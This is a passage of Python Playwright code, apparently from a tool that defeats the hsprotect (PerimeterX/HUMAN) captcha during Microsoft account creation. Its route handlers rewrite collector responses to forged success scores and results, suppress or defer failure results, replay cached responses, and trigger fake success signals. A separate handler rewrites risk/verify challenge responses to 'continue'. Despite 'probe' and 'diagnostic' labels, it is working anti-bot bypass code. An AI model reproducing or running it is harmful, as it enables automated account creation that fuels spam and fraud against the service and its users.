                    # shape used by the soft-hold probe, then fulfill the held
                    # W0 rich result from this same handler below.
                    final_parts = ["IoIoIo|score|1|binary"]
                    log_record["session_cached_rich_w0_fast_neutral_final"] = True
                    log_record["session_cached_rich_w0_pending_qi"] = str(meta.get("qi") or "")
                elif (
                    real_final_neutral_w0_success
                    or session_cached_rich_final_success
                    or session_cached_rich_w0_success
                    or session_cached_rich_final_and_w0_success
                ):
                    neutral_final_fetch_w0_by_qi[str(meta.get("qi") or "")] = {
                        "seq": form.get("seq"),
                        "rsc": form.get("rsc"),
                        "parts_without_result": 1,
                        "mode": (
                            "session_cached_rich_final_and_w0_success"
                            if session_cached_rich_final_and_w0_success
                            else "session_cached_rich_w0_success"
                            if session_cached_rich_w0_success
                            else "session_cached_rich_final_success"
                            if session_cached_rich_final_success
                            else "real_final_neutral_w0_success"
                        ),
                        "ready": False,
                    }
                    cached_bootstrap_parts = (
                        load_cached_final_parts()
                        if (
                            (session_cached_rich_final_success or session_cached_rich_final_and_w0_success)
                            and not session_rich_final_parts
                        )
                        else []
                    )
                    if cached_bootstrap_parts:
                        # When W0 is already queued, a slow route.fetch for
                        # the first final PX561 can make the response order
                        # diverge from the accepted trace.  Use the last rich
                        # final as a fast bootstrap and preserve the accepted
                        # rich result|0 shape on both final and W0.
                        final_parts = force_success_final_parts(cached_bootstrap_parts)
                        log_record["session_cached_rich_final_bootstrap_success"] = True
                        log_record["session_cached_rich_final_bootstrap_parts"] = len(cached_bootstrap_parts)
                    else:
                        try:
                            response = route.fetch(post_data=patched)
                            real_response_body = response.text()
                            from analyze_protocol_run import _decode_collector_response

                            real_decoded = _decode_collector_response(real_response_body, patched)
                            real_parts_for_session_cache = list(real_decoded.get("parts") or [])
                            if real_parts_for_session_cache:
                                session_rich_final_parts[:] = [str(p) for p in real_parts_for_session_cache]
                                session_rich_final_cache_qi = str(meta.get("qi") or "")
                                log_record["session_rich_final_parts_cached"] = len(session_rich_final_parts)
                                log_record["session_rich_final_cache_qi"] = session_rich_final_cache_qi
                            final_parts = neutralize_final_parts(real_parts_for_session_cache)
                            log_record["real_final_response_status"] = response.status
                            log_record["real_final_response_len"] = len(real_response_body or "")
                            log_record["real_final_response_decoded"] = real_decoded
                        except Exception as exc:
                            final_parts = ["IoIoIo|score|1|binary"]
                            log_record["real_final_fetch_error"] = repr(exc)[:240]
                else:
                    final_parts = (
                        load_cached_final_neutral_parts()
                        if neutral_final_cached_rich_w0_success
                        else ["IoIoIo|score|1|binary"]
                    )
                response_body = _encode_collector_response_body(patched, final_parts)
                if (
                    real_final_neutral_w0_success
                    or session_cached_rich_final_success
                    or session_cached_rich_w0_success
                    or session_cached_rich_final_and_w0_success
                ):
                    entry = neutral_final_fetch_w0_by_qi.setdefault(str(meta.get("qi") or ""), {
                        "seq": form.get("seq"),
                        "rsc": form.get("rsc"),
                        "parts_without_result": 1,
                        "mode": (
                            "session_cached_rich_final_and_w0_success"
                            if session_cached_rich_final_and_w0_success
                            else "session_cached_rich_w0_success"
                            if session_cached_rich_w0_success
                            else "session_cached_rich_final_success"
                            if session_cached_rich_final_success
                            else "real_final_neutral_w0_success"
                        ),
                    })
                    entry.update({
                        "ready": True,
                        "final_parts": len(final_parts),
                    })
                    if entry.get("w0_fulfilled"):
                        neutral_final_fetch_w0_by_qi.pop(str(meta.get("qi") or ""), None)
                else:
                    neutral_final_fetch_w0_by_qi[str(meta.get("qi") or "")] = {
                        "seq": form.get("seq"),
                        "rsc": form.get("rsc"),
                        "parts_without_result": 1,
                        "mode": (
                            "neutral_final_cached_rich_w0_success"
                            if neutral_final_cached_rich_w0_success
                            else "neutral_final_cached_w0_success"
                            if neutral_final_cached_w0_success
                            else ("neutral_final_merge_real_w0_success" if neutral_final_merge_w0_success else "neutral_final_fetch_real_w0")
                        ),
                    }
                log_record["response_status"] = 200
                log_record["response_len"] = len(response_body)
                log_record["response_decoded"] = {
                    "parts": final_parts,
                    "scores": [p for p in final_parts if str(p).startswith("IoIoIo|score|")],
                    "results": [p for p in final_parts if str(p).startswith("oIIoIooo|")],
                    "neutral_final_fetch_w0": True,
                    "neutral_final_merge_w0_success": bool(neutral_final_merge_w0_success),
                    "neutral_final_cached_w0_success": bool(neutral_final_cached_w0_success),
                    "neutral_final_cached_rich_w0_success": bool(neutral_final_cached_rich_w0_success),
                    "real_final_neutral_w0_success": bool(real_final_neutral_w0_success),
                    "session_cached_rich_final_success": bool(session_cached_rich_final_success),
                    "session_cached_rich_w0_success": bool(session_cached_rich_w0_success),
                    "session_cached_rich_final_and_w0_success": bool(session_cached_rich_final_and_w0_success),
                    "warmup_neutral_then_rich_final_and_w0_success": bool(warmup_neutral_then_rich_final_and_w0_success),
                }
                log_record["neutral_final_fetch_w0"] = True
                log_record["neutral_final_merge_w0_success"] = bool(neutral_final_merge_w0_success)
                log_record["neutral_final_cached_w0_success"] = bool(neutral_final_cached_w0_success)
                log_record["neutral_final_cached_rich_w0_success"] = bool(neutral_final_cached_rich_w0_success)
                log_record["real_final_neutral_w0_success"] = bool(real_final_neutral_w0_success)
                log_record["session_cached_rich_final_success"] = bool(session_cached_rich_final_success)
                log_record["session_cached_rich_w0_success"] = bool(session_cached_rich_w0_success)
                log_record["session_cached_rich_final_and_w0_success"] = bool(session_cached_rich_final_and_w0_success)
                log_record["warmup_neutral_then_rich_final_and_w0_success"] = bool(warmup_neutral_then_rich_final_and_w0_success)
                if neutral_final_cached_rich_w0_success:
                    log_record["neutral_final_cached_rich_parts"] = len(final_parts)
                maybe_delay_final_response(log_record, "neutral_final_w0_route")
                fulfill_pending_early_w0(str(meta.get("qi") or ""), log_record, "neutral_final_w0_route")
                write_log(log_record)
                print(
                    "[Probe] neutral final; next W0 will fetch real collector "
                    f"qi={meta.get('qi')} seq={form.get('seq')} tags={after_summary.get('tags')}"
                )
                return route.fulfill(
                    status=200,
                    headers={
                        "content-type": "application/json; charset=utf-8",
                        "access-control-allow-origin": "https://iframe.hsprotect.net",
                        "access-control-allow-credentials": "true",
                    },
                    body=response_body,
                )
            if (
                optimistic_final_success
                and defer_final_result_to_w0
                and "PX561" in (after_summary.get("tags") or [])
            ):
                # In 1s runs the hsprotect iframe can close status=-1 before a
                # remote collector response is available to rewrite.  Immediate
                # final result0 avoids that latency, but live accepted traces
                # submit CreateAccount only after the W0 response carries
                # result0.  So when both knobs are enabled, make the final
                # response neutral and hand the success to the queued/next W0.
                response_body = _encode_collector_response_body(
                    patched,
                    ["IoIoIo|score|1|binary"],
                )
                deferred_final_success_by_qi[str(meta.get("qi") or "")] = {
                    "seq": form.get("seq"),
                    "rsc": form.get("rsc"),
                    "parts_without_result": 1,
                    "optimistic_defer": True,
                }
                log_record["response_status"] = 200
                log_record["response_len"] = len(response_body)
                log_record["response_decoded"] = {
                    "parts": ["IoIoIo|score|1|binary"],
                    "scores": ["IoIoIo|score|1|binary"],
                    "results": [],
                    "optimistic_final_deferred_to_w0": True,
                }
                log_record["optimistic_final_deferred_to_w0"] = True
                write_log(log_record)
                print(
                    "[Probe] optimistic final deferred success to W0 "
                    f"qi={meta.get('qi')} seq={form.get('seq')} tags={after_summary.get('tags')}"
                )
                return route.fulfill(
                    status=200,
                    headers={
                        "content-type": "application/json; charset=utf-8",
                        "access-control-allow-origin": "https://iframe.hsprotect.net",
                        "access-control-allow-credentials": "true",
                    },
                    body=response_body,
                )
            if optimistic_final_success and "PX561" in (after_summary.get("tags") or []):
                response_body = _encode_collector_response_body(
                    patched,
                    ["IoIoIo|score|0|binary", "oIIoIooo|0"],
                )
                log_record["response_status"] = 200
                log_record["response_len"] = len(response_body)
                log_record["response_decoded"] = {
                    "parts": ["IoIoIo|score|0|binary", "oIIoIooo|0"],
                    "scores": ["IoIoIo|score|0|binary"],
                    "results": ["oIIoIooo|0"],
                    "optimistic": True,
                }
                log_record["risk_verify_gate_snapshot"] = remember_final_result_for_risk_gate(
                    str(meta.get("qi") or ""),
                    str(form.get("seq") or ""),
                    log_record.get("response_decoded"),
                    200,
                    "optimistic_final_success",
                )
                log_record["optimistic_final_success"] = True
                write_log(log_record)
                print(
                    "[Probe] optimistic final collector success fulfilled "
                    f"qi={meta.get('qi')} seq={form.get('seq')} tags={after_summary.get('tags')}"
                )
                fulfilled = route.fulfill(
                    status=200,
                    headers={
                        "content-type": "application/json; charset=utf-8",
                        "access-control-allow-origin": "https://iframe.hsprotect.net",
                        "access-control-allow-credentials": "true",
                    },
                    body=response_body,
                )
                if trigger_final_success_signals:
                    _trigger_hsprotect_success_signals(page, qi=str(meta.get("qi") or ""), reason="optimistic_final_success")
                return fulfilled
            try:
                is_final_fetch = "PX561" in (after_summary.get("tags") or [])
                if is_final_fetch:
                    final_fetch_guard["pending"] = int(final_fetch_guard.get("pending") or 0) + 1
                    final_fetch_guard["last_qi"] = str(meta.get("qi") or "")
                    final_fetch_guard["last_seq"] = str(form.get("seq") or "")
                fetch_start = time.perf_counter()
                try:
                    response = route.fetch(post_data=patched)
                finally:
                    if is_final_fetch:
                        final_fetch_guard["pending"] = max(0, int(final_fetch_guard.get("pending") or 0) - 1)
                        final_fetch_guard["guard_until"] = time.time() + max(0, int(delay_captcha_close_ms or 0)) / 1000.0
                log_record["route_fetch_ms"] = round((time.perf_counter() - fetch_start) * 1000.0, 1)
                try:
                    response_body = response.text()
                    log_record["response_status"] = response.status
                    log_record["response_len"] = len(response_body or "")
                    decoded_response = None
                    try:
                        from analyze_protocol_run import _decode_collector_response

                        decoded_response = _decode_collector_response(response_body, patched)
                        log_record["response_decoded"] = decoded_response
                        decoded_parts_for_qi = [str(p) for p in (decoded_response.get("parts") or [])]
                        if is_final_fetch:
                            log_record["risk_verify_gate_snapshot"] = remember_final_result_for_risk_gate(
                                str(meta.get("qi") or ""),
                                str(form.get("seq") or ""),
                                decoded_response,
                                response.status,
                                "route_fetch_final",
                            )
                        if (
                            qi_key
                            and decoded_parts_for_qi
                            and "PX561" not in (after_summary.get("tags") or [])
                            and (
                                any(p.startswith("IoooII|_px3|") for p in decoded_parts_for_qi)
                                or any(p.startswith("oIIoIIoo|_pxde|") for p in decoded_parts_for_qi)
                            )
                        ):
                            same_qi_rich_response_parts_by_qi[str(qi_key)] = decoded_parts_for_qi
                            log_record["same_qi_rich_response_parts_cached"] = len(decoded_parts_for_qi)
                    except Exception as dec_exc:
                        log_record["response_decode_error"] = repr(dec_exc)[:200]
                    if (
                        rewrite_final_result_success
                        and response.status == 200
                        and "PX561" in (after_summary.get("tags") or [])
                        and decoded_response
                    ):
                        source_parts = [str(p) for p in (decoded_response.get("parts") or [])]
                        parts = []
                        saw_result = False
                        saw_score = False
                        for part in source_parts:
                            if part.startswith("oIIoIooo|"):
                                parts.append("oIIoIooo|0")
                                saw_result = True
                            elif part.startswith("IoIoIo|score|"):
                                parts.append("IoIoIo|score|0|binary")
                                saw_score = True
                            else:
                                parts.append(part)
                        if not saw_result:
                            insert_at = len(parts)
                            for idx, part in enumerate(parts):
                                if part.startswith("IoooII|_px3|"):
                                    insert_at = idx
                                    break
                            parts.insert(insert_at, "oIIoIooo|0")
                        if not saw_score:
                            parts.append("IoIoIo|score|0|binary")
                        response_body = _encode_collector_response_body(patched, parts)
                        log_record["response_len"] = len(response_body or "")
                        log_record["response_rewritten_final_success"] = True
                        log_record["response_decoded_for_client"] = {
                            "parts": parts,
                            "results": [p for p in parts if p.startswith("oIIoIooo|")],
                            "scores": [p for p in parts if p.startswith("IoIoIo|score|")],
                            "rewrite_final_result_success": True,
                        }
                        fulfill_pending_early_w0(str(meta.get("qi") or ""), log_record, "rewrite_final_result_success")
                        write_log(log_record)
                        print(
                            "[Probe] final response rewritten to success "
                            f"qi={meta.get('qi')} seq={form.get('seq')} clientParts={len(parts)}"
                        )
                        fulfilled = route.fulfill(response=response, body=response_body)
                        if trigger_final_success_signals:
                            _trigger_hsprotect_success_signals(page, qi=str(meta.get("qi") or ""), reason="rewrite_final_result_success")
                        return fulfilled
                    if (
                        defer_final_result_to_w0
                        and response.status == 200
                        and "PX561" in (after_summary.get("tags") or [])
                        and decoded_response
                        and any(str(x).endswith("|0") for x in (decoded_response.get("results") or []))
                    ):
                        parts = [str(p) for p in (decoded_response.get("parts") or []) if str(p) != "oIIoIooo|0"]
                        if not parts:
                            parts = ["IoIIIo|cu"]
                        response_body = _encode_collector_response_body(patched, parts)
                        deferred_final_success_by_qi[str(meta.get("qi") or "")] = {
                            "seq": form.get("seq"),
                            "rsc": form.get("rsc"),
                            "parts_without_result": len(parts),
                        }
                        log_record["response_len"] = len(response_body or "")
                        log_record["response_deferred_to_w0"] = True
                        log_record["response_decoded_for_client"] = {
                            "parts": parts,
                            "results": [p for p in parts if p.startswith("oIIoIooo|")],
                            "scores": [p for p in parts if p.startswith("IoIoIo|score|")],
                            "defer_final_result_to_w0": True,
                        }
                        print(
                            "[Probe] final result0 deferred to next W0 "
                            f"qi={meta.get('qi')} seq={form.get('seq')} clientParts={len(parts)}"
                        )
                    elif (
                        optimistic_w0_success
                        and response.status == 200
                        and "PX561" in (after_summary.get("tags") or [])
                        and decoded_response
                        and any(str(x).startswith("oIIoIooo|") for x in (decoded_response.get("results") or []))
                    ):
                        # If we intend the decisive success to arrive on the
                        # subsequent W0 response, do not let an earlier final
                        # PX561 result|-1 put the iframe into a failure path.
                        parts = [
                            ("IoIoIo|score|0|binary" if str(p).startswith("IoIoIo|score|") else str(p))
                            for p in (decoded_response.get("parts") or [])
                            if not str(p).startswith("oIIoIooo|")
                        ]
                        if not parts:
                            parts = ["IoIIIo|cu"]
                        source_parts = [str(p) for p in (decoded_response.get("parts") or [])]
                        cu_parts = [p for p in source_parts if p == "IoIIIo|cu"]
                        pxde_parts = [p for p in source_parts if p.startswith("oIIoIIoo|_pxde|")]
                        px3_parts = [p for p in source_parts if p.startswith("IoooII|_px3|")]
                        optimistic_w0_parts_by_qi[str(meta.get("qi") or "")] = (
                            cu_parts + pxde_parts + ["oIIoIooo|0"] + px3_parts + ["IoIoIo|score|0|binary"]
                        )
                        response_body = _encode_collector_response_body(patched, parts)
                        log_record["response_len"] = len(response_body or "")
                        log_record["response_negative_result_suppressed_for_w0"] = True
                        log_record["response_decoded_for_client"] = {
                            "parts": parts,
                            "results": [p for p in parts if p.startswith("oIIoIooo|")],
                            "scores": [p for p in parts if p.startswith("IoIoIo|score|")],
                            "optimistic_w0_success": True,
                        }
                        print(
                            "[Probe] final result suppressed before optimistic W0 "
                            f"qi={meta.get('qi')} seq={form.get('seq')} clientParts={len(parts)}"
                        )
                    if "PX561" in (after_summary.get("tags") or []):
                        fulfill_pending_early_w0(str(meta.get("qi") or ""), log_record, "route_fetch_final")
                    write_log(log_record)
                    fulfilled = route.fulfill(response=response, body=response_body)
                    try:
                        if (
                            trigger_final_success_signals
                            and
                            response.status == 200
                            and "PX561" in (after_summary.get("tags") or [])
                            and decoded_response
                            and any(str(x).endswith("|0") for x in (decoded_response.get("results") or []))
                        ):
                            _trigger_hsprotect_success_signals(page, qi=str(meta.get("qi") or ""), reason="collector_final_result0")
                    except Exception as sig_exc:
                        print(f"[Probe] hsprotect success signal post-fetch error: {sig_exc!r}")
                    return fulfilled
                except Exception:
                    write_log(log_record)
                    return route.fulfill(response=response)
            except Exception as fetch_exc:
                log_record["route_fetch_error"] = repr(fetch_exc)[:240]
                write_log(log_record)
                print(f"[Probe] y1nz preproof route.fetch fallback: {fetch_exc!r}")
                return route.continue_(post_data=patched)
        except Exception as exc:
            print(f"[Probe] y1nz preproof normalize error for {url}: {exc!r}")
            try:
                return route.continue_()
            except Exception:
                return None

    try:
        page.route("**/*", handler)
        print("[Probe] y1nz preproof normalizer installed")
    except Exception as exc:
        print(f"[Probe] y1nz preproof normalizer install failed: {exc!r}")


def attach_risk_verify_continue_rewriter(page):
    """
    Experimental host-layer isolator: if risk/verify keeps returning another
    HumanCaptcha challenge after the HS client side reports success, rewrite the
    response into the successful host shape while preserving the live
    continuationToken.  This does not manufacture a token; it only tests whether
    the host flow is blocked by response shape or by server-side token state.
    """
    log_path = Path("Results") / "protocol_runtime" / f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_risk_verify_rewriter.jsonl"
    seen = {"count": 0}

    def write_log(record: dict):
        try:
            log_path.parent.mkdir(parents=True, exist_ok=True)
            with log_path.open("a", encoding="utf-8") as fh:
                fh.write(json.dumps(record, ensure_ascii=False, default=str) + "\n")
        except Exception:
            pass

    def handler(route, request):
        url = request.url
        try:
            if request.method != "POST" or "/api/v1.0/risk/verify" not in url:
                return route.continue_()
            seen["count"] = int(seen.get("count") or 0) + 1
            response = route.fetch()
            body = response.text()
            record = {
                "ts": datetime.now().isoformat(),
                "url": url,
                "idx": seen["count"],
                "status": response.status,
                "old_len": len(body or ""),
                "rewritten": False,
            }
            try:
                data = json.loads(body or "{}")
            except Exception as exc:
                record["json_error"] = repr(exc)[:160]
                write_log(record)
                return route.fulfill(status=response.status, headers=dict(response.headers), body=body)
            token = data.get("continuationToken")
            has_challenge = isinstance(data.get("challengeDetails"), dict)
            record["has_challenge"] = has_challenge
            record["has_token"] = bool(token)
            record["state"] = data.get("state")
            if seen["count"] >= 2 and has_challenge and token:
                new_body = json.dumps({"continuationToken": token, "state": "continue"}, separators=(",", ":"), ensure_ascii=False)
                record["rewritten"] = True
                record["new_len"] = len(new_body)
                write_log(record)
                print(f"[Probe] risk/verify challenge rewritten to continue idx={seen['count']}")
                headers = dict(response.headers)
                headers["content-type"] = "application/json; charset=utf-8"
                headers.pop("content-length", None)
                return route.fulfill(status=200, headers=headers, body=new_body)
            write_log(record)
            return route.fulfill(status=response.status, headers=dict(response.headers), body=body)
        except Exception as exc:
            write_log({"ts": datetime.now().isoformat(), "url": url, "error": repr(exc)[:240]})
            return route.continue_()

    try:
        page.route("**/api/v1.0/risk/verify*", handler)
        print(f"[Probe] risk/verify continue rewriter installed log={log_path}")
    except Exception as exc:
        print(f"[Probe] failed to install risk/verify continue rewriter: {exc!r}")


def attach_collector_capture(page):
    """
    Capture hsprotect collector metadata from Python without routing or
    injecting JavaScript before the challenge.  This supports deferred
    runtime-hook mode: the page stays pristine through the Y1NZ risk bootstrap,
    then we seed the late hook with the current qi/uuid so Knp and final-proof
    normalization can still run.
    """
    state = {"last": None, "items": [], "responses": [], "signals": [], "collector_pending": 0}
    try:
        setattr(page, "_pxprobe_collector_capture", state)
    except Exception:
        pass

    def get_post_data(request):
        try:
            data = request.post_data
        except Exception:
            try:
                data = request.post_data()
            except Exception:
                data = None
        return data or ""

    def on_request(request):
        try:
            url = request.url
            now = time.time()
            if "captcha.hsprotect.net/PXzC5j78di/captcha.js" in url:
                state.setdefault("signals", []).append({"seen_at": now, "phase": "request", "label": "captcha_js", "url": url[:180]})
            elif "iframe.hsprotect.net/index.html" in url:
                state.setdefault("signals", []).append({"seen_at": now, "phase": "request", "label": "hsprotect_iframe", "url": url[:180]})
            elif "browser.events.data.microsoft.com" in url:
                try:
                    body_hint = get_post_data(request) or ""
                except Exception:
                    body_hint = ""
                labels = [
                    marker for marker in (
                        "HumanCaptcha_Loaded",
                        "HumanCaptcha_Success",
                        "HumanCaptcha_Failure",
                        "RiskBlock",
                    )
                    if marker in body_hint
                ]
                for label in labels:
                    state.setdefault("signals", []).append({"seen_at": now, "phase": "request", "label": label, "url": url[:120]})
            if len(state.get("signals") or []) > 60:
                del state["signals"][:-60]
            if (
                request.method == "POST"
                and "collector-" in url
                and "hsprotect.net" in url
            ):
                state["collector_pending"] = int(state.get("collector_pending") or 0) + 1
                body = get_post_data(request)
                if "payload=" in body and "uuid=" in body:
                    form = parse_form_preserve_payload(body)
                    meta = decode_payload_meta_from_form(form)
                    tags = [
                        item.get("t")
                        for item in (meta.get("events") or [])
                        if isinstance(item, dict)
                    ]
                    item = {
                        "seen_at": now,
                        "url": url,
                        "body": body,
                        "qi": str(meta.get("qi") or ""),
                        "uuid": form.get("uuid") or "",
                        "appId": form.get("appId") or "PXzC5j78di",
                        "seq": form.get("seq"),
                        "rsc": form.get("rsc"),
                        "tags": tags,
                    }
                    state["last"] = item
                    state["items"].append(item)
                    if len(state["items"]) > 20:
                        del state["items"][:-20]
                    print(
                        "[Probe] collector capture "
                        f"qi={item['qi']} seq={item['seq']} rsc={item['rsc']} tags={tags}"
                    )
        except Exception as exc:
            print(f"[Probe] collector capture decode error: {exc!r}")

    def on_response(response):
        try:
            request = response.request
            url = response.url
            if not (
                getattr(request, "method", "") == "POST"
                and "collector-" in url
                and "hsprotect.net" in url
            ):
                if "captcha.hsprotect.net/PXzC5j78di/captcha.js" in url:
                    state.setdefault("signals", []).append({
                        "seen_at": time.time(),
                        "phase": "response",
                        "label": "captcha_js",
                        "status": getattr(response, "status", None),
                        "url": url[:180],
                    })
                    if len(state.get("signals") or []) > 60:
                        del state["signals"][:-60]
                elif "iframe.hsprotect.net/index.html" in url:
                    state.setdefault("signals", []).append({
                        "seen_at": time.time(),
                        "phase": "response",
                        "label": "hsprotect_iframe",
                        "status": getattr(response, "status", None),
                        "url": url[:180],
                    })
                    if len(state.get("signals") or []) > 60:
                        del state["signals"][:-60]
                return
            state["collector_pending"] = max(0, int(state.get("collector_pending") or 0) - 1)
            sent_body = get_post_data(request)
            if "payload=" not in sent_body or "uuid=" not in sent_body:
                return
            try:
                body = response.text()
            except Exception as exc:
                body = ""
                decode_error = f"response_text: {exc!r}"
            else:
                decode_error = None
            form = parse_form_preserve_payload(sent_body)
            meta = decode_payload_meta_from_form(form)
            tags = [
                item.get("t")
                for item in (meta.get("events") or [])
                if isinstance(item, dict)
            ]
            decoded = {}
            if body:
                try:
                    from analyze_protocol_run import _decode_collector_response

                    decoded = _decode_collector_response(body, sent_body) or {}
                except Exception as exc:
                    decoded = {"error": repr(exc)}
            if decode_error:
                decoded.setdefault("error", decode_error)
            scores = list(decoded.get("scores") or [])
            results = list(decoded.get("results") or [])
            pxde = list(decoded.get("pxde") or [])
            solution = {}
            for part in decoded.get("parts") or []:
                try:
                    bits = str(part).split("|")
                    if len(bits) >= 4 and bits[0] == "IoooII" and bits[1] == "_px3":
                        solution["px3"] = bits[3]
                    elif len(bits) >= 4 and bits[0] == "oIIoIIoo" and bits[1] == "_pxde":
                        solution["pxde"] = bits[3]
                except Exception:
                    pass
            item = {
                "seen_at": time.time(),
                "url": url,
                "status": getattr(response, "status", None),
                "qi": str(meta.get("qi") or ""),
                "uuid": form.get("uuid") or "",
                "appId": form.get("appId") or "PXzC5j78di",
                "seq": form.get("seq"),
                "rsc": form.get("rsc"),
                "tags": tags,
                "scores": scores,
                "results": results,
                "pxde_count": len(pxde),
                "solution": solution,
                "parts_preview": [str(p)[:260] for p in (decoded.get("parts") or [])[:8]],
                "error": decoded.get("error"),
            }
            state["responses"].append(item)
            if len(state["responses"]) > 30:
                del state["responses"][:-30]
            print(
                "[Probe] collector response "
                f"qi={item['qi']} seq={item['seq']} rsc={item['rsc']} "
                f"status={item['status']} scores={scores or '-'} results={results or '-'}"
            )
        except Exception as exc:
            print(f"[Probe] collector response decode error: {exc!r}")

    try:
        page.on("request", on_request)
        page.on("response", on_response)
        print("[Probe] collector capture listener installed")
    except Exception as exc:
        print(f"[Probe] collector capture listener install failed: {exc!r}")
    return state


def summarize_probe(data):
    api_calls = []
    collector = []
    for frame in data.get("frames", []):
        url = frame.get("url", "")
        probe = frame.get("probe") or {}
        for event in probe.get("events", []):
            kind = event.get("kind")
            if kind == "api_call":
                d = event.get("data") or {}
                api_calls.append((event.get("href") or url, d.get("name"), d.get("args")))
            elif kind == "child_api_call":
                outer = event.get("data") or {}
                d = outer.get("data") or {}
                api_calls.append((outer.get("href") or url, d.get("name"), d.get("args")))
            elif kind == "collector_response":
                d = event.get("data") or {}
                cmds = (((d.get("decoded") or {}).get("commands")) or [])
                collector.append((event.get("href") or url, [c.get("preview") for c in cmds if c.get("id") in {"oIIoIooo", "IoooII", "IoIoIo", "oIIoIIoo"}]))
            elif kind == "child_collector_response":
                outer = event.get("data") or {}
                d = outer.get("data") or {}
                cmds = (((d.get("decoded") or {}).get("commands")) or [])
                collector.append((outer.get("href") or url, [c.get("preview") for c in cmds if c.get("id") in {"oIIoIooo", "IoooII", "IoIoIo", "oIIoIIoo"}]))
    print(f"[Probe] api_calls={len(api_calls)} collector_responses={len(collector)}")
    px1200 = [(u, a) for u, name, a in api_calls if name == "PX1200"]
    print(f"[Probe] PX1200 calls={len(px1200)}")
    for i, (url, args) in enumerate(px1200[:12], 1):
        print(f"  PX1200[{i}] frame={url[:90]} args={json.dumps(args, ensure_ascii=False)[:500]}")
    for i, (url, previews) in enumerate(collector[-8:], 1):
        if previews:
            print(f"  collector[{i}] frame={url[:90]}")
            for preview in previews:
                print(f"    {preview[:260]}")


def summarize_collector_capture(data, tail=10):
    capture = data.get("collector_capture") or {}
    items = list(capture.get("items") or [])
    responses = list(capture.get("responses") or [])
    print(f"[Probe] collector_capture requests={len(items)} responses={len(responses)}")
    for item in items[-tail:]:
        print(
            "  req "
            f"seq={item.get('seq')} qi={item.get('qi')} rsc={item.get('rsc')} "
            f"tags={item.get('tags')}"
        )
    for item in responses[-tail:]:
        print(
            "  resp "
            f"seq={item.get('seq')} qi={item.get('qi')} rsc={item.get('rsc')} "
            f"status={item.get('status')} scores={item.get('scores') or '-'} "
            f"results={item.get('results') or '-'} error={item.get('error') or ''}"
        )


def wait_challenge_state(page, timeout_ms=15000):
    deadline = time.time() + timeout_ms / 1000.0
    while time.time() < deadline:
        try:
            if page.locator('iframe[title="验证质询"]').count() > 0 or page.locator('iframe#enforcementFrame').count() > 0:
                return "visible"
        except Exception:
            pass
        page.wait_for_timeout(300)
    return "unknown"


def protocol_chctx_score_probe(page, out_dir, email, mode, wait_ms=8000):
    """
    Low-cost diagnostic mode: stop at hsprotect challenge bootstrap, collect
    only collector request/response score evidence, and never press/solve the
    challenge.  This isolates whether ch_ctx seq=0/1 already returns score|1
    before any final-proof or hold automation can contaminate the run.
    """
    state = getattr(page, "_pxprobe_collector_capture", None) or {}
    start_req = len(state.get("items") or [])
    start_resp = len(state.get("responses") or [])
    print(
        "[Probe] chctx_score_probe: challenge visible; "
        f"waiting {wait_ms}ms without hold/final proof "
        f"(start requests={start_req} responses={start_resp})"
    )
    deadline = time.time() + max(1000, int(wait_ms or 0)) / 1000.0
    saw_seq1_score = False
    while time.time() < deadline:
        responses = list((state.get("responses") or [])[start_resp:])
        for resp in responses:
            if str(resp.get("seq")) == "1" and resp.get("scores"):
                saw_seq1_score = True
                break
        if saw_seq1_score and time.time() + 0.8 < deadline:
            # keep a short tail window so any immediate follow-up W0/retry is
            # captured, but still avoid entering proof generation.
            page.wait_for_timeout(800)
            break
        page.wait_for_timeout(250)
    path, data_saved = save_probe_state(page, out_dir, email, mode, "chctx_score")
    print(f"[Probe] saved chctx_score: {path}")
    summarize_collector_capture(data_saved)
    return False


PX_NAMESPACE_DISCOVERY_JS = r"""
({wanted}) => {
  const ownStringKeys = obj => {
    try { return Reflect.ownKeys(obj).filter(k => typeof k === 'string'); } catch (_) {}
    try { return Object.getOwnPropertyNames(obj); } catch (_) {}
    return [];
  };
  const pxFunctionKeys = obj => {
    try { return ownStringKeys(obj).filter(k => /^PX\d+$/.test(k) && typeof obj[k] === 'function'); } catch (_) {}
    return [];
  };
  const namespaces = [];
  const seen = new Set();
  for (const ns of ownStringKeys(window)) {
    let obj = null;
    try { obj = window[ns]; } catch (_) { continue; }
    if (!obj || (typeof obj !== 'object' && typeof obj !== 'function')) continue;
    const keys = pxFunctionKeys(obj);
    if (/^_?PX/i.test(ns) || ns === 'PX' || /PXzC5j78di/i.test(ns) || keys.length) {
      if (!seen.has(ns)) {
        seen.add(ns);
        namespaces.push({ ns, keys });
      }
    }
  }
  const winKeys = pxFunctionKeys(window);
  if (winKeys.length) namespaces.push({ ns: '__window__', keys: winKeys });
  const wantedSet = new Set(wanted || []);
  const matched = namespaces.filter(x => !wantedSet.size || x.keys.some(k => wantedSet.has(k)));
  return { href: location.href, namespaces, matched };
}
"""


def wait_for_px_api(page, wanted=None, timeout_ms=15000):
    wanted = wanted or []
    deadline = time.time() + max(1000, timeout_ms) / 1000
    last = []
    while time.time() < deadline:
        for frame in page.frames:
            try:
                res = frame.evaluate(PX_NAMESPACE_DISCOVERY_JS, {"wanted": wanted})
                if res.get("matched"):
                    print(f"[Probe] px api ready in frame={frame.url[:100]} matched={res.get('matched')}")
                    return True
                if res.get("namespaces"):
                    last.append({"frame": frame.url, "namespaces": res.get("namespaces")})
            except Exception:
                continue
        page.wait_for_timeout(120)
    if last:
        print("[Probe] px api wait timeout; last namespaces:")
        print(json.dumps(last[-5:], ensure_ascii=False, indent=2)[:2000])
    else:
        print("[Probe] px api wait timeout; no namespaces observed")
    return False


def iter_api_call_events(data, names=None):
    names = set(names or [])
    for frame in data.get("frames", []):
        for event in ((frame.get("probe") or {}).get("events") or []):
            kind = event.get("kind")
            if kind == "api_call":
                d = event.get("data") or {}
                name = d.get("name")
                if not names or name in names:
                    yield {"href": event.get("href"), "ns": d.get("ns"), "name": name, "args": d.get("args") or []}
            elif kind == "child_api_call":
                outer = event.get("data") or {}
                d = outer.get("data") or {}
                name = d.get("name")
                if not names or name in names:
                    yield {"href": outer.get("href"), "ns": d.get("ns"), "name": name, "args": d.get("args") or []}


def extract_api_calls(path, names=None, max_events=None):
    data = json.loads(Path(path).read_text(encoding="utf-8"))
    if isinstance(data, list):
        wanted = set(names or [])
        calls = [c for c in data if isinstance(c, dict) and (not wanted or c.get("name") in wanted)]
    else:
        calls = list(iter_api_call_events(data, names))
    if max_events:
        calls = calls[:max_events]
    return calls


def make_auto_actions(
    mode,
    functions=None,
    replay_path=None,
    max_replay_events=None,
    synthetic_hold_ms=11800,
